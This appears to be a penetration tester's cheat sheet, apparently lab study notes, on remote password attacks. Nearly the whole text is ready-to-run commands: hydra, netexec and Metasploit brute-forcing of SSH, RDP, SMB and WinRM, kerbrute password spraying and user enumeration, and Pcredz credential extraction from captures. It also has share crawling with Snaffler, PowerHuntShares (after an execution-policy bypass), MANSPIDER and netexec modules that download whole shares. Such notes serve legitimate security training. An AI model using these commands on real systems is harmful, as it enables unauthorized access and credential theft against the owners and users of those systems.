# Remote Password Attacks

## Network Services and Credential Hunting

**Winrm**
````
$ netexec winrm <IP> -u user.list -p password.list
````

**Hydra: ssh, smb, rdp**
````
$ hydra -L user.list -P password.list ssh://<IP>
$ hydra -L user.list -P password.list rdp://<IP>
$ hydra -L user.list -P password.list smb://<IP>
$ hydra -l username -P password.list <service>://<ip>
------------------------------------------------
- Metasploit SMB -
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197
msf6 auxiliary(scanner/smb/smb_login) > set rhosts <IP>
````

**Password Spraying**
````
$ netexec smb <IP>/24 -u <usernames.list> -p 'ChangeMe123!'
$ kerbrute passwordspray -d test.local domain_users.txt password123
````

**Enumerate Valid Users**
````
$ ./kerbrute_linux_amd64 userenum --dc <IP> --domain <domain> <list_of_users>
````

**Credential Stuffing**

https://github.com/ihebski/DefaultCreds-cheat-sheet
````
$ creds search linksys
$ creds search tomcat
$ creds search <service>
````

## Credential Hunting

**Network Traffic**

Pcredz is a tool that can be used to extract credentials from live traffic or network packet captures. Specifically, it supports extracting the following information:

Credit card numbers
POP credentials
SMTP credentials
IMAP credentials
SNMP community strings
FTP credentials
Credentials from HTTP NTLM/Basic headers, as well as HTTP Forms
NTLMv1/v2 hashes from various traffic including DCE-RPC, SMBv1/2, LDAP, MSSQL, and HTTP
Kerberos (AS-REQ Pre-Auth etype 23) hashes
````
https://github.com/lgandx/PCredz
$ ./Pcredz -f demo.pcapng -t -v
````

**Network Shares**

Common credential patterns:

- Look for keywords within files such as passw, user, token, key, and secret.
- Search for files with extensions commonly associated with stored credentials, such as .ini, .cfg, .env, .xlsx, .ps1, and .bat.
- Watch for files with "interesting" names that include terms like config, user, passw, cred, or initial.

**Hunting from Windows**

Snaffler
````
c:\Users\Public>Snaffler.exe -s
````

PowerHuntShares
````
# Bypass execution policy restrictions
> Set-ExecutionPolicy -Scope Process Bypass
# Import module that exists in the current directory
> Import-Module .\PowerHuntShares.psm1
> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
````

**Hunting from Linux**

MANSPIDER
````
https://github.com/blacklanternsecurity/MANSPIDER
$ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <IP> -c 'passw' -u '<user>' -p '<password>'
````

NetExec
````
$ nxc smb <IP> -u <user> -p '<user>' --spider <share> --content --pattern "passw"
$ nxc smb <IP> -u '<user>' -p '<user>' --shares -M spider_plus -o DOWNLOAD_FLAG=True (Dwonload all files)
````

